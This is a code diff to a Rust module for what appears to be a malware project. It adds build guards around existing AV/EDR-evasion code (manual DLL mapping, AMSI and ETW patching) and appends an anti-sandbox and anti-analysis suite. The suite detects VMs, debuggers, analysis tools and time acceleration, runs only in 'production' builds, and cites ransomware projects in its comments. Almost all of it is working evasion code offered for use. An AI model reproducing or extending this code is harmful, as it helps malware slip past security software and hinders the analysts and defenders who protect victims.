@@ -1,11 +1,18 @@
 // Evasión avanzada para bypass AV/EDR
+#[cfg(target_os = "windows")]
 use std::ptr;
+#[cfg(target_os = "windows")]
 use std::mem;
+#[cfg(target_os = "windows")]
 use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
+#[cfg(target_os = "windows")]
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};
+#[cfg(target_os = "windows")]
 use winapi::shared::minwindef::{LPVOID, DWORD};
+#[cfg(target_os = "windows")]
 use winapi::um::errhandlingapi::GetLastError;
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct IMAGE_DOS_HEADER {
     e_magic: u16,
@@ -13,6 +20,7 @@ struct IMAGE_DOS_HEADER {
     e_lfanew: i32,
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct IMAGE_NT_HEADERS {
     signature: u32,
@@ -20,6 +28,7 @@ struct IMAGE_NT_HEADERS {
     optional_header: IMAGE_OPTIONAL_HEADER,
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct IMAGE_FILE_HEADER {
     machine: u16,
@@ -31,6 +40,7 @@ struct IMAGE_FILE_HEADER {
     characteristics: u16,
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct IMAGE_OPTIONAL_HEADER {
     magic: u16,
@@ -44,6 +54,7 @@ struct IMAGE_OPTIONAL_HEADER {
     _padding4: [u8; 56],
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct IMAGE_SECTION_HEADER {
     name: [u8; 8],
@@ -55,6 +66,7 @@ struct IMAGE_SECTION_HEADER {
     characteristics: u32,
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct IMAGE_EXPORT_DIRECTORY {
     _padding1: [u8; 16],
@@ -70,6 +82,7 @@ struct IMAGE_EXPORT_DIRECTORY {
 
 
 /// Manual DLL mapping (bypass LoadLibrary hooks)
+#[cfg(target_os = "windows")]
 pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
     // 1. Parse DOS header
     if dll_bytes.len() < mem::size_of::<IMAGE_DOS_HEADER>() {
@@ -151,6 +164,7 @@ pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
 }
 
 /// Obtener dirección de función exportada
+#[cfg(target_os = "windows")]
 pub unsafe fn get_export_address(base_addr: LPVOID, func_name: &str) -> Option<LPVOID> {
     let dos_header = &*(base_addr as *const IMAGE_DOS_HEADER);
     let nt_headers = &*((base_addr as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS);
@@ -205,6 +219,7 @@ pub unsafe fn get_export_address(base_addr: LPVOID, func_name: &str) -> Option<L
 }
 
 /// AMSI bypass (patch AmsiScanBuffer)
+#[cfg(target_os = "windows")]
 pub unsafe fn bypass_amsi() -> bool {
     use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
     
@@ -249,7 +264,13 @@ pub unsafe fn bypass_amsi() -> bool {
     true
 }
 
+#[cfg(not(target_os = "windows"))]
+pub unsafe fn bypass_amsi() -> bool {
+    false
+}
+
 /// ETW bypass (patch EtwEventWrite)
+#[cfg(target_os = "windows")]
 pub unsafe fn bypass_etw() -> bool {
     use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
     
@@ -292,4 +313,478 @@ pub unsafe fn bypass_etw() -> bool {
     );
     
     true
+}
+
+#[cfg(not(target_os = "windows"))]
+pub unsafe fn bypass_etw() -> bool {
+    false
+}
+
+// ============================================================================
+// Anti-Sandbox and Anti-Analysis Features
+// ============================================================================
+// These features are conditionally compiled and only active in production mode
+// They detect VMs, sandboxes, debuggers, and other analysis environments
+// Inspired by: Rust-Ransomware, rustomware, and Nightmangle
+
+/// Checks if the system is running in a sandbox environment
+/// Returns true if sandbox is detected, false otherwise
+#[cfg(all(feature = "production", target_os = "windows"))]
+pub fn is_sandbox() -> bool {
+    // Multiple checks to detect sandbox environments
+    detect_vm() || detect_sandbox_artifacts() || detect_low_resources() || detect_debugger()
+}
+
+/// Dummy implementation for non-Windows or dev mode
+#[cfg(not(all(feature = "production", target_os = "windows")))]
+pub fn is_sandbox() -> bool {
+    false
+}
+
+/// Detects if running inside a Virtual Machine
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn detect_vm() -> bool {
+    use std::process::Command;
+    
+    // Check 1: BIOS/System manufacturer
+    if check_system_manufacturer() {
+        return true;
+    }
+    
+    // Check 2: Common VM registry keys
+    if check_vm_registry_keys() {
+        return true;
+    }
+    
+    // Check 3: VM-specific files
+    if check_vm_files() {
+        return true;
+    }
+    
+    // Check 4: MAC address patterns (VMware, VirtualBox, QEMU)
+    if check_vm_mac_address() {
+        return true;
+    }
+    
+    false
+}
+
+/// Check system manufacturer for VM indicators
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_system_manufacturer() -> bool {
+    use std::process::Command;
+    
+    let output = Command::new("wmic")
+        .args(&["computersystem", "get", "manufacturer"])
+        .output();
+    
+    if let Ok(out) = output {
+        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
+        
+        // Known VM manufacturers
+        let vm_vendors = [
+            "vmware",
+            "virtualbox",
+            "qemu",
+            "microsoft corporation", // Hyper-V
+            "xen",
+            "parallels",
+        ];
+        
+        for vendor in &vm_vendors {
+            if text.contains(vendor) {
+                return true;
+            }
+        }
+    }
+    
+    false
+}
+
+/// Check for VM-specific registry keys
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_vm_registry_keys() -> bool {
+    use std::process::Command;
+    
+    // VMware registry keys
+    let vmware_keys = [
+        r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
+        r"HKLM\SYSTEM\ControlSet001\Services\vmmouse",
+        r"HKLM\SYSTEM\ControlSet001\Services\vmhgfs",
+    ];
+    
+    // VirtualBox registry keys
+    let vbox_keys = [
+        r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
+        r"HKLM\HARDWARE\ACPI\DSDT\VBOX__",
+    ];
+    
+    // Check VMware keys
+    for key in &vmware_keys {
+        let output = Command::new("reg")
+            .args(&["query", key])
+            .output();
+        
+        if let Ok(out) = output {
+            if out.status.success() {
+                return true;
+            }
+        }
+    }
+    
+    // Check VirtualBox keys
+    for key in &vbox_keys {
+        let output = Command::new("reg")
+            .args(&["query", key])
+            .output();
+        
+        if let Ok(out) = output {
+            if out.status.success() {
+                return true;
+            }
+        }
+    }
+    
+    false
+}
+
+/// Check for VM-specific files
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_vm_files() -> bool {
+    use std::path::Path;
+    
+    let vm_files = [
+        r"C:\windows\System32\Drivers\Vmmouse.sys",
+        r"C:\windows\System32\Drivers\vmhgfs.sys",
+        r"C:\windows\System32\Drivers\VBoxMouse.sys",
+        r"C:\windows\System32\Drivers\VBoxGuest.sys",
+        r"C:\windows\System32\Drivers\VBoxSF.sys",
+        r"C:\windows\System32\vboxdisp.dll",
+        r"C:\windows\System32\vboxhook.dll",
+        r"C:\windows\System32\vboxoglerrorspu.dll",
+    ];
+    
+    for file in &vm_files {
+        if Path::new(file).exists() {
+            return true;
+        }
+    }
+    
+    false
+}
+
+/// Check MAC address for VM patterns
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_vm_mac_address() -> bool {
+    use std::process::Command;
+    
+    let output = Command::new("getmac")
+        .output();
+    
+    if let Ok(out) = output {
+        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
+        
+        // Known VM MAC address prefixes
+        let vm_mac_prefixes = [
+            "00:05:69", // VMware
+            "00:0c:29", // VMware
+            "00:1c:14", // VMware
+            "00:50:56", // VMware
+            "08:00:27", // VirtualBox
+            "52:54:00", // QEMU/KVM
+            "00:15:5d", // Hyper-V
+        ];
+        
+        for prefix in &vm_mac_prefixes {
+            if text.contains(prefix) {
+                return true;
+            }
+        }
+    }
+    
+    false
+}
+
+/// Detects sandbox-specific artifacts
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn detect_sandbox_artifacts() -> bool {
+    use std::process::Command;
+    use std::path::Path;
+    
+    // Check 1: Known sandbox process names
+    if check_sandbox_processes() {
+        return true;
+    }
+    
+    // Check 2: Sandbox-specific files
+    let sandbox_files = [
+        r"C:\analysis",
+        r"C:\sandbox",
+        r"C:\sample.exe",
+        r"C:\malware.exe",
+    ];
+    
+    for file in &sandbox_files {
+        if Path::new(file).exists() {
+            return true;
+        }
+    }
+    
+    // Check 3: Wine detection (used in some sandboxes)
+    if check_wine() {
+        return true;
+    }
+    
+    false
+}
+
+/// Check for known sandbox processes
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_sandbox_processes() -> bool {
+    use std::process::Command;
+    
+    let output = Command::new("tasklist")
+        .output();
+    
+    if let Ok(out) = output {
+        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
+        
+        // Known sandbox/analysis tool processes
+        let sandbox_processes = [
+            "vmsrvc.exe",
+            "vmusrvc.exe",
+            "vboxtray.exe",
+            "vmwaretray.exe",
+            "vmwareuser.exe",
+            "vmacthlp.exe",
+            "sandboxiedcomlaunch.exe",
+            "sandboxierpcss.exe",
+            "procmon.exe",
+            "procexp.exe",
+            "wireshark.exe",
+            "fiddler.exe",
+            "ollydbg.exe",
+            "ida.exe",
+            "ida64.exe",
+            "x64dbg.exe",
+            "x32dbg.exe",
+            "windbg.exe",
+        ];
+        
+        for proc in &sandbox_processes {
+            if text.contains(proc) {
+                return true;
+            }
+        }
+    }
+    
+    false
+}
+
+/// Check for Wine (Windows emulation layer)
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_wine() -> bool {
+    use std::process::Command;
+    
+    let output = Command::new("reg")
+        .args(&["query", r"HKCU\Software\Wine"])
+        .output();
+    
+    if let Ok(out) = output {
+        if out.status.success() {
+            return true;
+        }
+    }
+    
+    false
+}
+
+/// Detects if system has suspiciously low resources (common in sandboxes)
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn detect_low_resources() -> bool {
+    // Check 1: Low RAM (sandboxes typically have < 4GB)
+    if check_low_memory() {
+        return true;
+    }
+    
+    // Check 2: Low CPU cores (sandboxes typically have 1-2 cores)
+    if check_low_cpu_cores() {
+        return true;
+    }
+    
+    // Check 3: Small disk size
+    if check_small_disk() {
+        return true;
+    }
+    
+    false
+}
+
+/// Check if system has suspiciously low RAM
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_low_memory() -> bool {
+    use std::process::Command;
+    
+    let output = Command::new("wmic")
+        .args(&["computersystem", "get", "totalphysicalmemory"])
+        .output();
+    
+    if let Ok(out) = output {
+        let text = String::from_utf8_lossy(&out.stdout);
+        
+        // Parse memory value (in bytes)
+        for line in text.lines() {
+            if let Ok(bytes) = line.trim().parse::<u64>() {
+                // Less than 4GB is suspicious
+                let gb = bytes / (1024 * 1024 * 1024);
+                if gb < 4 {
+                    return true;
+                }
+            }
+        }
+    }
+    
+    false
+}
+
+/// Check if system has suspiciously few CPU cores
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_low_cpu_cores() -> bool {
+    use std::process::Command;
+    
+    let output = Command::new("wmic")
+        .args(&["cpu", "get", "numberofcores"])
+        .output();
+    
+    if let Ok(out) = output {
+        let text = String::from_utf8_lossy(&out.stdout);
+        
+        for line in text.lines() {
+            if let Ok(cores) = line.trim().parse::<u32>() {
+                // Less than 2 cores is suspicious
+                if cores < 2 {
+                    return true;
+                }
+            }
+        }
+    }
+    
+    false
+}
+
+/// Check if disk is suspiciously small
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn check_small_disk() -> bool {
+    use std::process::Command;
+    
+    let output = Command::new("wmic")
+        .args(&["logicaldisk", "where", "DeviceID='C:'", "get", "size"])
+        .output();
+    
+    if let Ok(out) = output {
+        let text = String::from_utf8_lossy(&out.stdout);
+        
+        for line in text.lines() {
+            if let Ok(bytes) = line.trim().parse::<u64>() {
+                // Less than 60GB is suspicious
+                let gb = bytes / (1024 * 1024 * 1024);
+                if gb < 60 {
+                    return true;
+                }
+            }
+        }
+    }
+    
+    false
+}
+
+/// Detects if a debugger is attached
+#[cfg(all(feature = "production", target_os = "windows"))]
+fn detect_debugger() -> bool {
+    unsafe {
+        // Use IsDebuggerPresent WinAPI
+        use winapi::um::debugapi::IsDebuggerPresent;
+        
+        if IsDebuggerPresent() != 0 {
+            return true;
+        }
+        
+        // Additional check: PEB BeingDebugged flag
+        if check_peb_being_debugged() {
+            return true;
+        }
+    }
+    
+    false
+}
+
+/// Check PEB (Process Environment Block) BeingDebugged flag
+#[cfg(all(feature = "production", target_os = "windows"))]
+unsafe fn check_peb_being_debugged() -> bool {
+    use winapi::um::processthreadsapi::GetCurrentProcess;
+    use winapi::um::winnt::HANDLE;
+    
+    // Access PEB through TEB (Thread Environment Block)
+    // This is a more direct way to check the BeingDebugged flag
+    #[cfg(target_arch = "x86_64")]
+    {
+        let peb: *const u8;
+        std::arch::asm!(
+            "mov {}, gs:[0x60]",
+            out(reg) peb,
+            options(nostack, preserves_flags)
+        );
+        
+        if !peb.is_null() {
+            // BeingDebugged is at offset 0x02 in PEB
+            let being_debugged = *peb.add(0x02);
+            if being_debugged != 0 {
+                return true;
+            }
+        }
+    }
+    
+    false
+}
+
+/// Time-based sandbox detection
+/// Many sandboxes accelerate time to speed up analysis
+#[cfg(all(feature = "production", target_os = "windows"))]
+pub fn detect_time_acceleration() -> bool {
+    use std::time::{Duration, Instant};
+    use std::thread;
+    
+    let start = Instant::now();
+    thread::sleep(Duration::from_secs(1));
+    let elapsed = start.elapsed();
+    
+    // If less than 900ms elapsed, time was accelerated
+    if elapsed.as_millis() < 900 {
+        return true;
+    }
+    
+    false
+}
+
+/// Comprehensive anti-sandbox check
+/// Runs multiple checks and returns true if any sandbox indicator is found
+#[cfg(all(feature = "production", target_os = "windows"))]
+pub fn run_anti_sandbox_checks() -> bool {
+    // Run all checks
+    if is_sandbox() {
+        return true;
+    }
+    
+    // Time acceleration check
+    if detect_time_acceleration() {
+        return true;
+    }
+    
+    false
+}
+
+/// Dummy implementation for dev mode or non-Windows
+#[cfg(not(all(feature = "production", target_os = "windows")))]
+pub fn run_anti_sandbox_checks() -> bool {
+    false
 }
